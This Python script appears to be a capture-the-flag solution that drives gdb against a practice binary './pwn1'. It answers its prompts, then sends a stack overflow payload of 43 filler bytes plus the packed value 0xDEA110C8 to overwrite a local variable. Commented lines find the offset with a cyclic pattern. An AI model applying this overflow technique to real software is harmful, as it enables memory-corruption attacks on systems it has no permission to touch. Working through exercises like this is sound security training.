import os
import string
import sys
from pprint import pp
from time import sleep

# import pexpect
from pwnlib.util.cyclic import cyclic_gen
from pwnlib.util.packing import p32

from helper import spawngdb

# from pexpect import replwrap

LOGO = "gef➤"
TARGET = "./pwn1"

g = spawngdb(logo=LOGO)
print(g.before, end="")

g.cmd(f"file {TARGET}")
g.cmd(f"b *0x565558b2")
g.cmd(f"run")

g.expect("name?")

g.sendline("Sir Lancelot of Camelot")
g.sendline("To seek the Holy Grail.")

# g.ctrl_c(); g.interact()

g.sendraw(b"A" * 43 + bytes(p32(0xDEA110C8)) + b"\n")

# c = cyclic_gen(string.ascii_uppercase, n=4)
# print(c.find(0x41414c41))
# g.sendline(c.get(300))
# g.ctrl_c()
# exit()

g.cmd(f"x/40bx $ebp-0x10")
g.cmd(f"x/wx $ebp-0x10")
g.cmd(f"continue")
g.cmd(f"quit")
g.interact()
sys.stdout.flush()
print("__THE_END__")
exit()
